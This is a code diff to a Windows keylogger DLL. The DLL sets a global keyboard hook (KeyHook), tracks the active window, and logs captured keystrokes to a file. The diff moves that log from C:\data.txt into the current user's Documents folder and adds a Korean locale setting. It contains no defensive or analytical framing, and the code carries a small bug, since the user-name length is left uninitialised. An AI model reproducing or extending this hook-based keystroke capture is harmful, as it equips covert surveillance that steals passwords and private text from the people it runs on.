@@ -1,6 +1,8 @@
 #include <windows.h>
 #include <WinUser.h>
+#include <tchar.h>
 #include <fstream>
+#include <locale.h>
 
 
 #pragma data_seg(".shared")
@@ -11,7 +13,7 @@ HINSTANCE g_hInst = NULL;
 
 #pragma data_seg()
 #pragma comment(linker, "/section:.shared,RWS")
-
+char filepath[256];
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
 {
@@ -33,7 +35,16 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
 	return TRUE;
 }
 
+void GetFilePath()
+{
+	TCHAR Username[10];
+	DWORD UserLen;
+	TCHAR tFilePath[256];
+	GetUserName(Username, &UserLen);
+	wsprintf(tFilePath, TEXT("C:\\Users\\%s\\Documents\\data.txt"), Username);
+	WideCharToMultiByte(CP_ACP, 0, tFilePath, 256, filepath, 256, NULL, NULL);
 
+}
 
 LRESULT CALLBACK KeyHook(int code, WPARAM wParam, LPARAM lParam)
 {
@@ -43,8 +54,16 @@ LRESULT CALLBACK KeyHook(int code, WPARAM wParam, LPARAM lParam)
 	static BOOL count = FALSE;
 	static HWND oldWindow = NULL;
 	static char cWindow[255];
-	const char *filepath = "C:\\data.txt";
+	static bool isFirst = FALSE;
 	FILE *f;
+
+	if (!isFirst)
+	{
+		isFirst = TRUE;
+		setlocale(LC_ALL, "Korean");
+		GetFilePath();
+	}
+
 	
 
 	if (code == HC_ACTION) {
